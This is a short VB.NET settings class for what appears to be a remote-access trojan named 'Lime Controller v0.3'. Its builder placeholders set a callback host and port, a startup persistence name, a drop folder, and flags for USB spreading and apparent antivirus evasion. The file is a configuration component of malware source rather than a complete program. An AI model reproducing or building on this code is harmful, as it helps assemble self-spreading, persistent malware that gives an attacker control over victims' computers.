
Namespace Lime
    Public Class Settings
        Public Shared LHOST As String = "%LHOST%"
        Public Shared LPORT As Integer = "%LPORT%"
        Public Shared SPL As String = "'L'"
        Public Shared LVER As String = "Controller 0.3"
        Public Shared LEXE As String = "%LEXE%"
        Public Shared STUPNAME As String = "%STNAME%"
        Public Shared NMT As Threading.Mutex = Nothing
        Public Shared MTX As String = "Lime_Controller_v0.3"
        Public Shared SPUSB As Boolean = "%SPUSB%"
        Public Shared ANTIV As Boolean = "%ANTIV%"
        Public Shared DRCHK As Boolean = "%DRCHK%"
        Public Shared DRPATH As String = "%DRPATH%"
        Public Shared DRFOLDER As String = "%DRFOLDER%"
        Public Shared SPUSB_TEXT As String
        Public Shared NEXE As Object = New IO.FileInfo(Reflection.Assembly.GetExecutingAssembly.Location)
        Public Shared fullpath = Interaction.Environ(DRPATH) & "\" & DRFOLDER & "\" & LEXE
    End Class
End Namespace
